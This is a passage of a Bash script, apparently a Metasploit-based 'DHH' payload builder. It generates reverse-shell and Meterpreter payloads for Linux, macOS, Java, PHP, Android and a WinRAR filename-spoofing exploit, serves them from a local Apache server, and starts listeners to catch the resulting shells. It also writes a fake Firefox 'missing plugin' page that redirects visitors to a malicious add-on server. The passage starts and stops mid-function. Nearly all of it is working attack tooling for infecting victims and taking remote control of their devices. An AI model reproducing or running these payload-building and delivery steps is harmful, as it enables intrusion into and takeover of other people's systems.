echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD linux/x86/shell/bind_tcp; exploit -j'"
else

if [ $choice = 2 ];then
clear
fi
fi

}


linu8 () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [elf] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                             
echo "$BLUE PAYLOAD    $GREEN:>$RED linux/x86/shell/reverse_ipv6_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/html/$name $GREEN"  
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
lin=.elf
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p linux/x86/shell/reverse_ipv6_tcp LHOST=$host LPORT=$port -a x86 --platform Linux -f elf > $hh/Desktop/Output/$name$lin"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$lin
cp $name$lin /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD linux/x86/shell/reverse_ipv6_tcp; exploit -j'"
else

if [ $choice = 2 ];then
clear
fi
fi

}



function linu  {

clear

cat << ! 

$RED
┌─┐─┐ ┬┌─┐┬  ┌─┐┬┌┬┐  ╦  ┬┌┐┌┬ ┬─┐ ┬
├┤ ┌┴┬┘├─┘│  │ ││ │   ║  │││││ │┌┴┬┘
└─┘┴ └─┴  ┴─┘└─┘┴ ┴   ╩═╝┴┘└┘└─┘┴ └─$BLUE

PAYLOADS
=========


METERPRETER
===========$GREEN 
1 $BLUE > linux/x86/meterpreter/reverse_tcp $GREEN
2 $BLUE > linux/aarch64/meterpreter_reverse_tcp $GREEN
3 $BLUE > linux/aarch64/meterpreter_reverse_http $GREEN
4 $BLUE > linux/aarch64/meterpreter_reverse_https $BLUE

SHEEL
========$GREEN
5 $BLUE > linux/x86/shell/reverse_tcp $GREEN
6 $BLUE > linux/x86/shell/bind_ipv6_tcp $GREEN
7 $BLUE > linux/x86/shell/bind_tcp $GREEN
8 $BLUE > linux/x86/shell/reverse_ipv6_tcp $GREEN

9 $BLUE >$RED EXIT $GREEN   

!
echo "============================================="
echo
echo -n "Choice pyload :>$RED "
read linu
case $linu in
1)linre ;;
2)linu2 ;;
3)linu3 ;;
4)linu4 ;;
5)linu5 ;;
6)linu6 ;;
7)linu7 ;;
8)linu8 ;;
9)exie ;;
*) echo "\"$linu\":$RED[x]$BLUE The error of your choice does not exist"; sleep 2 ;;
esac
linu

}




mac () {
clear

cat << !

$RED

┌─┐─┐ ┬┌─┐┬  ┌─┐┬┌┬┐  ╔╦╗╔═╗╔═╗  ╔═╗╔═╗
├┤ ┌┴┬┘├─┘│  │ ││ │   ║║║╠═╣║    ║ ║╚═╗
└─┘┴ └─┴  ┴─┘└─┘┴ ┴   ╩ ╩╩ ╩╚═╝  ╚═╝╚═╝$GREEN
!
echo "============================================="$BLUE
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [macho] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
echo "$BLUE PAYLOAD    $GREEN:>$RED osx/x86/shell_reverse_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p osx/x86/shell_reverse_tcp LHOST=$host LPORT=$port -a x86 --platform OSX -f macho > $hh/Desktop/Output/$name"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name
cp $name /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listener " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD osx/x86/shell_reverse_tcp; exploit -j'"
else

if [ $choice = 2 ];then
clear
fi
fi

}




java () {
clear

cat << !

$RED

┌┬┐┬ ┬┬ ┌┬┐┬ ┬  ┌─┐─┐ ┬┌─┐┬  ┌─┐┬┌┬┐
││││ ││  │ │ │  ├┤ ┌┴┬┘├─┘│  │ ││ │ 
┴ ┴└─┘┴─┘┴ └─┘  └─┘┴ └─┴  ┴─┘└─┘┴ ┴$GREEN
 
!
echo "============================================="$BLUE
echo
echo "please wait.........."
sleep 2
clear
echo
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo
echo -n "Enter LHOST=$RED"
read LHOST
echo "" $GREEN
sleep 1
echo "LHOST==>$BLUE $LHOST "$GREEN
echo
echo "==========================="
echo
echo -n "Enter LPORT=$RED "
read port
echo "" $GREEN
sleep 1
echo "LPORT==>$BLUE $port "$GREEN
echo
echo "==========================="
echo
echo -n "Enter URIPATH=$RED"
read URIPATH
echo "" $GREEN
sleep 1
echo "URIPATH==>$BLUE $URIPATH"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for pyload=$RED"
read name
echo "" $GREEN
sleep 1
echo "NAME=>>$BLUE $name "$GREEN
echo
echo "============================="
sleep 1
echo
clear
echo
echo
echo " Payload [jar] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $LHOST $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"  
echo "$BLUE PAYLOAD    $GREEN:>$RED multi/browser/java_signed_applet $GREEN"
echo "$BLUE URIPATH    $GREEN:>$RED $URIPATH $GREEN "
echo "$BLUE SAVE IN    $GREEN:>$RED $hh/Desktop/Output/$name and /var/www/html/$name"
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo ""$GREEN
echo
echo "Output Fonud "
echo
echo
echo
echo
else
mkdir Output
fi
cd ..
sleep 1
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
javaa=.jar
xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p java/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$port R > $hh/Desktop/Output/$name$javaa"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$javaa
cp $name$javaa /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - Create Listener  on [ $GREEN $name ]"$BLUE
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting listener on $BLUE[$name]"
sleep 1
xterm -T "DHH - listener on [$name] " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/browser/java_signed_applet; set LHOST $LHOST; set SRVHOST $LHOST; set URIPATH $URIPATH; set LPORT $port; set PAYLOAD java/meterpreter/reverse_tcp; set target 0; exploit -j'"

elif [ $choice = 2 ];then
clear
fi


}


web () {
clear

cat << !

$RED

┬ ┬┌─┐┌┐ ┌─┐┬ ┬┌─┐  ┌─┐┌─┐┬ ┬┬  ┌─┐┌─┐┌┬┐  
│││├┤ ├┴┐├─┘├─┤├─┘  ├─┘├─┤└┬┘│  │ │├─┤ ││  
└┴┘└─┘└─┘┴  ┴ ┴┴    ┴  ┴ ┴ ┴ ┴─┘└─┘┴ ┴─┴┘$GREEN  

!
echo "============================================="$BLUE
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip ]           "
echo "                                          "
echo "Your Public IP Address:[ $myip2 ]         "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [php] Final Config:      "
echo "=================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
echo "$BLUE PAYLOAD    $GREEN:>$RED php/meterpreter/reverse_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
dds=.php
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p php/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f raw > $hh/Desktop/Output/$name$dds"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$dds
cp $name$dds /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [ $GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listener " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD php/meterpreter/reverse_tcp; exploit -j'"

elif [ $choice = 2 ];then
clear
fi


}

wiri () {
clear

cat << !

$RED

                                                                                        
                                                                  
 _ _ _ _                    _____         _     _                 
| | | |_|___ ___ ___ ___   | __  |___ ___| |_ _| |___ ___ ___     
| | | | |   |  _| .'|  _|  | __ -| .'|  _| '_| . | . | . |  _|    
|_____|_|_|_|_| |__,|_|    |_____|__,|___|_,_|___|___|___|_|      
                                                             $GREEN     
!
echo "==================================================================="$BLUE
echo
echo "please wait........."
sleep 3 
clear
echo ""
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter your zip name=$RED"
read name
fainalnem=$name > /dev/null 2>&1
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo
echo "==========================="
sleep 1
echo
echo -n "Enter Spoof file=$RED"
read spooff
echo "" $GREEN
sleep 1
echo "spoof file==>$BLUE $spooff "$GREEN
echo
sleep 2
clear
echo    
echo                                                                                       
echo " Final [Win backdoor] Config:      " 
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"  
echo "$BLUE SpoofFile  $GREEN:>$RED $spooff $GREEN"
echo "$BLUE PAYLOAD    $GREEN:>$RED windows/fileformat/winrar_name_spoofing $GREEN"
echo "$BLUE SAVE IN    $GREEN:>$RED $hh/Desktop/Output/$name and /var/www/html/$name $GREEN"
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Output fonud "
echo
echo
else
mkdir Output
fi
cd ..
sleep 1
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
xterm -T "DHH - Create: $name" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/windows/fileformat/winrar_name_spoofing; set LHOST $host; set SPOOF $spooff; set TARGET 0; exploit -j'"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/.msf4/local
      chmod +x msf.zip && mv msf.zip $name
      cp $name /var/www/html && cp $name $hh/Desktop/Output/ 
cd ..
echo $BLUE"[*]$RED:$GREEN Done! "
echo
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [ $GREEN $name ]"$BLUE
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting listener on $BLUE[$name]"
sleep 1
xterm -T "DHH - [$name] Listener" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set PAYLOAD windows/meterpreter/reverse_tcp; exploit -j'"

elif [ $choice = 2 ];then
clear
fi


}

fireadd () {
clear
echo

cat << !


$RED
 _______ __              ___                            __     __ __ __   __              
|    ___|__|.----.-----.'  _|.-----.--.--.    .---.-.--|  |.--|  |__|  |_|__|.-----.-----.
|    ___|  ||   _|  -__|   _||  _  |_   _|    |  _  |  _  ||  _  |  |   _|  ||  _  |     |
|___|   |__||__| |_____|__|  |_____|__.__|    |___._|_____||_____|__|____|__||_____|__|__| $GREEN
                                                                                          

!
echo "==========================================================================================="$BLUE
echo
echo "Please wait........"
sleep 3
clear
echo ""
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter SRVHOST=$RED"
read SRVHOST
echo ""$GREEN
sleep 1
echo "SRVHOST==>$BLUE $SRVHOST "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter SRVPORT=$RED"
read SRVPORT
echo $GREEN
sleep 1
echo "SRVPORT==>$BLUE $SRVPORT "$GREEN
echo
echo
echo "==========================="
sleep 1
echo
echo -n "Enter NAME For Fake Addition=$RED"
read addition
echo "" $GREEN
sleep 1
echo "Fake Addition NAME==>$BLUE $addition "$GREEN
echo
echo
echo
echo "=============================="
sleep 1
echo
echo -n "Enter URIPATH=$RED"
read URIPATH
echo "" $GREEN
sleep 1
echo "URIPATH==>$BLUE $URIPATH "$GREEN
echo
echo "=============================="
sleep 1
echo -n "Enter HTML TITLE=$RED"
read htmlti
echo "" $GREEN
sleep 1
echo "HTML TITLE==>$BLUE $htmlti "$GREEN
sleep 2
clear
echo    
echo                                                                                       
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Output Found"
echo
echo
else
mkdir Output
fi
cd $hh/Desktop/Output/
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE index.html $RED] "

         echo "<html><head></head><body>" > index.html
         echo "<title>$addition:$htmlti</title><br /><br />" >> index.html
         echo "<center><b>ERROR:404:FIREFOX:MISSING:PLUGIN:$addition!</b></center>" >> index.html
         echo "<link rel="shortcut icon" type="image/x-icon" a href="https://addons.cdn.mozilla.net/media/img/favicon.ico">" >> index.html
         echo "<meta http-equiv='refresh' content='5; url=http://$SRVHOST:$SRVPORT$URIPATH' />" >> index.html
         echo "</body></html>" >> index.html
cd ..
sleep 3
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 3
clear
echo
echo
echo ""$GREEN
echo " [Facke Add] Final Config: "
echo "==============================================="
echo "$BLUE SRVHOST            $GREEN:>$RED $SRVHOST $GREEN"
echo "$BLUE SRVPORT            $GREEN:>$RED $SRVPORT $GREEN"
echo "$BLUE Fake-Add-NAME      $GREEN:>$RED $addition $GREEN"
echo "$BLUE HTML-TITLE         $GREEN:>$RED $htmlti $GREEN"
echo "$BLUE SAVE IN            $GREEN:>$RED $hh/Desktop/Output/index.html and /var/www/html/index.html $GREEN"
sleep 3
echo
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
apa=/var/www/html
cd $hh/Desktop/Output
cp index.html $apa/index.html
sleep 1
echo $BLUE"[*]$RED:$GREEN Done! "
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 1
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo
echo "$RED Done Fake Firefox addition has been Created in$GREEN ->>>$BLUE[ $apa/index.html and /root/Desktop/Output/index.html ]"
echo
echo
sleep 7
clear
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [ $GREEN $addition $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting listener on $BLUE[$addition]"
sleep 2
xterm -T "DHH - listener on [ $addition ]" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/browser/firefox_xpi_bootstrapped_addon; set TARGET 1; set ADDONNAME $addition; set SRVHOST $SRVHOST; set URIPATH $URIPATH; set AutoUninstall 1; set SRVPORT $SRVPORT; exploit -j'"

elif [ $choice = 2 ];then
clear
fi

}

and1 () {
clear
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [APK] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
echo "$BLUE PAYLOAD    $GREEN:>$RED android/meterpreter/reverse_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
aa=.apk
sleep 1
xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p android/meterpreter/reverse_tcp  LHOST=$host LPORT=$port -a dalvik --platform Android -f raw > $hh/Desktop/Output/$name$aa"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$aa
cp $name$aa /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
 xterm -T "DHH - [$name] Listener" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD android/meterpreter/reverse_tcp; exploit -j'"
else

if [ $choice = 2 ];then
clear
fi
fi

}


and2 () {
clear
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [APK] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
echo "$BLUE PAYLOAD    $GREEN:>$RED android/meterpreter/reverse_http $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
aa=.apk
sleep 1
xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p android/meterpreter/reverse_http LHOST=$host LPORT=$port -a dalvik --platform Android -f raw > $hh/Desktop/Output/$name$aa"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$aa
cp $name$aa /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
 xterm -T "DHH - [$name] Listener" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD android/meterpreter/reverse_http; exploit -j'"
else

if [ $choice = 2 ];then
clear
fi
fi

}

and3 () {
clear
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
